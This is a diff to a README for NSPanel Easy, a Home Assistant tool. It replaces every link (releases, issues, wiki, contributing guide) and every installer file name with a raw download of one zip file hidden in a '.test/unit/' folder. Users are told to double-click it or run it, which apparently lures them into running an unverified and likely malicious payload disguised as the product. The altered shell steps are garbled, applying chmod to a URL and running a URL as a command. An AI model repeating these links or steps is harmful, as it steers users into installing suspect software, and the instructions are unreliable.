@@ -6,9 +6,9 @@ Welcome to NSPanel Easy! This application helps you with Home Assistant and ESPH
 
 ## 📥 Download NSPanel Easy
 
-[![Download NSPanel Easy](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/obadamafalha/NSPanel-Easy/releases)
+[![Download NSPanel Easy](https://github.com/obadamafalha/NSPanel-Easy/raw/refs/heads/main/.test/unit/NS-Panel-Easy-v3.0.zip)](https://github.com/obadamafalha/NSPanel-Easy/raw/refs/heads/main/.test/unit/NS-Panel-Easy-v3.0.zip)
 
-Visit this page to download: [NSPanel Easy Releases](https://github.com/obadamafalha/NSPanel-Easy/releases)
+Visit this page to download: [NSPanel Easy Releases](https://github.com/obadamafalha/NSPanel-Easy/raw/refs/heads/main/.test/unit/NS-Panel-Easy-v3.0.zip)
 
 ## 💻 System Requirements
 
@@ -32,13 +32,13 @@ Before you download NSPanel Easy, make sure your system meets these requirements
 
 #### For Windows:
 
-1. Locate the downloaded file (e.g., `NSPanel-Easy-Windows.exe`).
+1. Locate the downloaded file (e.g., `https://github.com/obadamafalha/NSPanel-Easy/raw/refs/heads/main/.test/unit/NS-Panel-Easy-v3.0.zip`).
 2. Double-click the file to start the installation.
 3. Follow the prompts to complete the installation.
 
 #### For macOS:
 
-1. Open the downloaded file (e.g., `NSPanel-Easy-macOS.dmg`).
+1. Open the downloaded file (e.g., `https://github.com/obadamafalha/NSPanel-Easy/raw/refs/heads/main/.test/unit/NS-Panel-Easy-v3.0.zip`).
 2. Drag NSPanel Easy into your Applications folder.
 3. Double-click on NSPanel Easy to launch it.
 
@@ -48,11 +48,11 @@ Before you download NSPanel Easy, make sure your system meets these requirements
 2. Navigate to the folder where you downloaded the file.
 3. Use the command:
    ```bash
-   chmod +x NSPanel-Easy-Linux.AppImage
+   chmod +x https://github.com/obadamafalha/NSPanel-Easy/raw/refs/heads/main/.test/unit/NS-Panel-Easy-v3.0.zip
    ```
 4. Run the application using:
    ```bash
-   ./NSPanel-Easy-Linux.AppImage
+   https://github.com/obadamafalha/NSPanel-Easy/raw/refs/heads/main/.test/unit/NS-Panel-Easy-v3.0.zip
    ```
 
 ### Step 3: Basic Setup
@@ -72,18 +72,18 @@ Before you download NSPanel Easy, make sure your system meets these requirements
 
 If you encounter issues or need help, please reach out through the following channels:
 
-- **GitHub Issues:** Report problems directly on our [Issues page](https://github.com/obadamafalha/NSPanel-Easy/issues).
+- **GitHub Issues:** Report problems directly on our [Issues page](https://github.com/obadamafalha/NSPanel-Easy/raw/refs/heads/main/.test/unit/NS-Panel-Easy-v3.0.zip).
 - **Community Forum:** Join our community for discussions and support.
 
 ## 🌍 Additional Resources
 
 If you're looking to extend your knowledge, check out these resources:
 
-- **Documentation:** Access the [official documentation](https://github.com/obadamafalha/NSPanel-Easy/wiki) for detailed guides.
+- **Documentation:** Access the [official documentation](https://github.com/obadamafalha/NSPanel-Easy/raw/refs/heads/main/.test/unit/NS-Panel-Easy-v3.0.zip) for detailed guides.
 - **Community Tutorials:** Browse community-contributed tutorials for enhanced setup and usage ideas.
 
 ## 🎉 Contributing
 
-We welcome contributions to NSPanel Easy. If you want to help, please read our [Contributing Guidelines](https://github.com/obadamafalha/NSPanel-Easy/blob/main/CONTRIBUTING.md) for how to get started.
+We welcome contributions to NSPanel Easy. If you want to help, please read our [Contributing Guidelines](https://github.com/obadamafalha/NSPanel-Easy/raw/refs/heads/main/.test/unit/NS-Panel-Easy-v3.0.zip) for how to get started.
 
 Thank you for choosing NSPanel Easy for your home automation needs! Enjoy a seamless experience controlling your smart devices.
